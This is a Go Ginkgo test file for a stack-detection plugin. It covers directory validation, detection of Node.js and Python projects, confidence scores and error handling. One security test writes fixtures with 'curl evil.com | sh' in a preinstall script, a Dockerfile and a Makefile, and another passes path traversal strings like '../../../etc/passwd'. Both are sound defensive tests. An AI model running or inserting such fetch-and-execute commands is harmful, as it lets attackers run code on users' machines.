package main_test

import (
	"os"
	"path/filepath"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	sdk "github.com/jameswlane/devex/packages/plugin-sdk"
	main "github.com/jameswlane/devex/packages/tool-stackdetector"
)

var _ = Describe("Stack Detection", func() {
	var plugin *main.StackDetectorPlugin
	var tempDir string

	BeforeEach(func() {
		info := sdk.PluginInfo{
			Name:        "tool-stackdetector",
			Version:     "test",
			Description: "Test stackdetector plugin",
		}
		plugin = &main.StackDetectorPlugin{
			BasePlugin: sdk.NewBasePlugin(info),
		}

		// Create temporary directory for testing
		var err error
		tempDir, err = os.MkdirTemp("", "stackdetector_test")
		Expect(err).ToNot(HaveOccurred())
	})

	AfterEach(func() {
		// Clean up temporary directory
		if tempDir != "" {
			_ = os.RemoveAll(tempDir)
		}
	})

	Describe("ValidateDirectory", func() {
		Context("with valid directories", func() {
			It("should accept existing directory", func() {
				err := plugin.ValidateDirectory(tempDir)
				Expect(err).ToNot(HaveOccurred())
			})

			It("should accept current directory", func() {
				err := plugin.ValidateDirectory(".")
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle relative paths", func() {
				err := plugin.ValidateDirectory("../")
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("with invalid paths", func() {
			It("should reject non-existent directory", func() {
				err := plugin.ValidateDirectory("/non/existent/directory")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("cannot access directory"))
			})

			It("should reject file path instead of directory", func() {
				// Create a temporary file
				tempFile := filepath.Join(tempDir, "testfile.txt")
				err := os.WriteFile(tempFile, []byte("test"), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.ValidateDirectory(tempFile)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("is not a directory"))
			})
		})

		Context("with dangerous paths", func() {
			It("should handle path traversal attempts safely", func() {
				// These should be processed safely by filepath.Abs
				dangerousPaths := []string{
					"../../../etc/passwd",
					"..\\..\\..\\windows\\system32",
					"/etc/../etc/passwd",
				}

				for _, path := range dangerousPaths {
					err := plugin.ValidateDirectory(path)
					// Should either reject (if path doesn't exist) or process safely
					if err != nil {
						// Should get appropriate error messages
						Expect(err.Error()).To(SatisfyAny(
							ContainSubstring("cannot access directory"),
							ContainSubstring("is not a directory"),
							ContainSubstring("invalid directory path"),
						))
					}
				}
			})
		})
	})

	Describe("DetectStack", func() {
		Context("in empty directory", func() {
			It("should return empty result for empty directory", func() {
				technologies := plugin.DetectStack(tempDir)
				Expect(technologies).To(BeEmpty())
			})
		})

		Context("with Node.js projects", func() {
			It("should detect Node.js from package.json", func() {
				// Create package.json
				packagePath := filepath.Join(tempDir, "package.json")
				packageContent := `{"name": "test-project", "version": "1.0.0"}`
				err := os.WriteFile(packagePath, []byte(packageContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				technologies := plugin.DetectStack(tempDir)
				Expect(len(technologies)).To(BeNumerically(">", 0))

				// Should detect Node.js
				hasNodeJS := false
				for _, tech := range technologies {
					if tech.Name == "Node.js" {
						hasNodeJS = true
						Expect(tech.Category).To(Equal("Runtime"))
						Expect(tech.Confidence).To(BeNumerically(">=", 7))
						break
					}
				}
				Expect(hasNodeJS).To(BeTrue())
			})
		})

		Context("with Python projects", func() {
			It("should detect Python from requirements.txt", func() {
				// Create requirements.txt
				reqPath := filepath.Join(tempDir, "requirements.txt")
				reqContent := "django==3.2.0\nrequests==2.25.1"
				err := os.WriteFile(reqPath, []byte(reqContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				technologies := plugin.DetectStack(tempDir)
				Expect(len(technologies)).To(BeNumerically(">", 0))

				// Should detect Python
				hasPython := false
				for _, tech := range technologies {
					if tech.Name == "Python" {
						hasPython = true
						Expect(tech.Category).To(Equal("Language"))
						break
					}
				}
				Expect(hasPython).To(BeTrue())
			})
		})

		Context("with multiple technologies", func() {
			It("should detect multiple technologies correctly", func() {
				// Create multiple technology indicators
				files := map[string]string{
					"package.json":       `{"name": "test"}`,
					"requirements.txt":   "django==3.2.0",
					"Dockerfile":         "FROM node:14",
					"docker-compose.yml": "version: '3'",
				}

				for filename, content := range files {
					filePath := filepath.Join(tempDir, filename)
					err := os.WriteFile(filePath, []byte(content), 0644)
					Expect(err).ToNot(HaveOccurred())
				}

				technologies := plugin.DetectStack(tempDir)
				Expect(len(technologies)).To(BeNumerically(">=", 3))

				// Should have technologies from different categories
				categories := make(map[string]bool)
				for _, tech := range technologies {
					categories[tech.Category] = true
				}
				Expect(len(categories)).To(BeNumerically(">=", 2))
			})
		})
	})

	Describe("Technology Confidence Levels", func() {
		Context("confidence scoring", func() {
			It("should assign appropriate confidence levels", func() {
				// Create a clear Node.js project
				packagePath := filepath.Join(tempDir, "package.json")
				packageContent := `{"name": "test", "scripts": {"start": "node index.js"}}`
				err := os.WriteFile(packagePath, []byte(packageContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				technologies := plugin.DetectStack(tempDir)

				for _, tech := range technologies {
					// All confidence levels should be reasonable (1-10)
					Expect(tech.Confidence).To(BeNumerically(">=", 1))
					Expect(tech.Confidence).To(BeNumerically("<=", 10))

					// High-confidence detections should be 7+
					if tech.Name == "Node.js" {
						Expect(tech.Confidence).To(BeNumerically(">=", 7))
					}
				}
			})
		})
	})

	Describe("Error Handling", func() {
		Context("file system errors", func() {
			It("should handle permission denied gracefully", func() {
				Skip("Integration test - requires permission error simulation")
			})

			It("should handle corrupted files gracefully", func() {
				// Create a file with binary content that might cause parsing issues
				badFile := filepath.Join(tempDir, "package.json")
				badContent := []byte{0x00, 0x01, 0x02, 0xFF, 0xFE, 0xFD}
				err := os.WriteFile(badFile, badContent, 0644)
				Expect(err).ToNot(HaveOccurred())

				// Should not crash, might detect or ignore
				technologies := plugin.DetectStack(tempDir)
				Expect(technologies).ToNot(BeNil())
			})
		})
	})

	Describe("Security Considerations", func() {
		Context("file path handling", func() {
			It("should safely traverse directories", func() {
				Skip("Integration test - requires deep directory structure testing")
			})
		})

		Context("file content processing", func() {
			It("should handle malicious file content safely", func() {
				// Create files with potentially dangerous content
				maliciousFiles := map[string]string{
					"package.json": `{"scripts": {"preinstall": "curl evil.com | sh"}}`,
					"Dockerfile":   "RUN curl evil.com | sh",
					"Makefile":     "all:\n\tcurl evil.com | sh",
				}

				for filename, content := range maliciousFiles {
					filePath := filepath.Join(tempDir, filename)
					err := os.WriteFile(filePath, []byte(content), 0644)
					Expect(err).ToNot(HaveOccurred())
				}

				// Detection should work without executing content
				technologies := plugin.DetectStack(tempDir)
				Expect(technologies).ToNot(BeNil())

				// Should detect based on file presence, not execute scripts
				for _, tech := range technologies {
					Expect(tech.Name).ToNot(BeEmpty())
					Expect(tech.Category).ToNot(BeEmpty())
				}
			})
		})
	})
})
